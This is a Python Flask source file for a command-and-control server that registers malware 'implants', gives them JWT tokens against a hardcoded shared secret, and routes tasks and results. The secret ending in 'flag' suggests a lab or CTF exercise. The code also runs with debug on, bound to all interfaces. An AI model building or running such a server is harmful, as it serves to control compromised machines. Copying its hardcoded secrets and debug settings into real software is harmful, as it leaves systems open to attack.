
import resources

from flask import Flask, request, Response, jsonify
from flask_restful import Api
from database.db import initialize_db
from flask_jwt_extended import JWTManager, create_access_token
from database.models import Implant

app = Flask(__name__)
app.config['JWT_SECRET_KEY'] = 'super-secret-pass-5522-flag'
app.config['MONGODB_SETTINGS'] = {
    'db': 'C2Server',
    'host': 'mongodb://localhost:27017/C2Server'
}

initialize_db(app)

api = Api(app)
jwt = JWTManager(app)

secretkey = "e7bcc0ba5fb1dc9cc09460baaa2a6986"

@app.route('/config', methods=['POST'])
def register():
    try:
        implantID = request.json.get('implant_id', None)

        if not implantID :
            return jsonify({"msg": "bay"}), 400
        body = request.get_json()
        findimp = Implant.objects(implant_id=str(implantID)).first()
        if findimp:
            return jsonify({"msg": "welcome again"}), 200
        imp = Implant(**body)
        imp.save()
        return jsonify({"msg": "Implant Registered"}), 200
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

@app.route('/login', methods=['POST'])
def login():
    try:
        implantID = request.json.get('implantID', None)
        secret = request.json.get('secret', None)

        if not implantID or not secret:
            return jsonify({"msg": "bay"}), 400

        imp = Implant.objects(implant_id=str(implantID)).first()
        print(imp.to_json())
        if imp and secret == secretkey:
            access_token = create_access_token(identity=implantID, expires_delta=False)
            return jsonify(access_token=access_token), 200
        else:
            return jsonify({"msg": "Invalid Token"}), 401
    except Exception as e:
        return jsonify({"msg": "bay"}), 500

api.add_resource(resources.Tasks, '/tasks', endpoint='tasks')
api.add_resource(resources.Results, '/results', endpoint='results')

if __name__ == '__main__':
    app.run(port=5000,debug=True,host='0.0.0.0')